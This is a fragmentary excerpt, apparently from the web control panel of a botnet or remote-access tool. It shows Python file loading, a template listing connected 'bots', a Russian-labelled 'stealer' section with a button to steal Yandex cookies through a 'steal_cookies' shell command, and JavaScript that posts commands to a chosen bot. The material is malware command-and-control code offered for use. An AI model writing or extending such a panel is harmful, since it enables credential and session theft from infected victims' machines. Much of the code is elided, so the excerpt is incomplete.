...
def load_aliases():
    if os.path.exists(os.path.join(BASE_DIR, ALIASES_FILE)):
        with open(os.path.join(BASE_DIR, ALIASES_FILE), 'r', encoding='utf-8') as f:
...
{% if bots_list %}
    ...
    <div class="control-block stealer-buttons"><h3>Стиллер (внешний модуль)</h3><button onclick="sendShellCommand('steal_cookies')">Украсть Cookies (yandex_cookie.py)</button></div>
...
<script>
    ...
    if(volumeSlider) volumeSlider.addEventListener('input', () => { volumeOutput.value = volumeSlider.value + '%'; });  async function sendCommand(endpoint, body) { const botId = mainBotSelect.value; if (!botId) return; body.bot_id = botId; return fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }); }
